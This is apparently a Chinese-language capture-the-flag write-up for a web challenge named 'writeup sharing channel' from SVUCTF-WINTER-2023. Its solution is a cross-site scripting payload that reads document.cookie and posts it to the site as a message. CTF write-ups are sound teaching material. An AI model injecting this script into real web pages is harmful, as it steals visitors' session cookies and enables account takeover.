# 题解分享频道

- 作者：13m0n4de
- 参考：SVUCTF-WINTER-2023
- 难度：Baby/Trivial/Easy/Normal/Medium/Hard/Expert/Insane
- 分类：Web
- 镜像：[svuctf-winter-2023/writeup_channel](ghcr.io/svuctf/svuctf-winter-2023/writeup_channel:latest)
- 端口：5000

## 题目描述

> **请勿分享自己的链接，或点击其他人分享的链接，以免造成安全问题**

## 题目解析

```html
<script>
    var form_data = new FormData();
    form_data.append("message", document.cookie);
    fetch("/", {
    	"method": "POST",
    	"body": form_data,
    });
</script>
```

